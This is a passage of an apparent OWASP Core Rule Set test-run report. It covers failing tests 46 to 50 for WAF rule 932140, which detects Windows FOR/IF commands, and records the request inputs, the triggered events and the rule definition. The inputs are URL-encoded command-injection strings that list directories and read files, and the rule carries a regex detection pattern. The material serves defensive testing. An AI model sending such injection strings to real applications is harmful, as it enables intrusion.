Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 46,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%2Ff+%22tokens%3D%2A%22+%25G+in+%28%27dir+%2Fb+%2Fs+%2Fa%3Ad+%22C%3A%5CWork%5Creports%2A%22%27%29+do+echo+Found+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 47,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920460 - Abnormal character escapes in request", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 47,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=for+%2Ff+%22tokens%3D%2A%22+%25%25G+in+%28%27dir+%2Fb+%2Fs+%2Fa%3Ad+%22C%3A%5CWork%5Creports%2A%22%27%29+do+echo+Found+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 48,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 48,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FD+%2Fr+%25G+in+%28%22User%2A%22%29+DO+Echo+We+found+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 49,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 49,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D1%2C3+delims%3D%2C%22+%25%25G+IN+%28weather.txt%29+DO+%40echo+%25%25G+%25%25H",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 50,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942200 - Detects MySQL comment-/space-obfuscated injections and backtick termination", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 50,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22tokens%3D4+delims%3D%2C%22+%25%25G+IN+%28%22deposit%2C%244500%2C123.4%2C12-AUG-09%22%29+DO+%40echo+Date+paid+%25%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
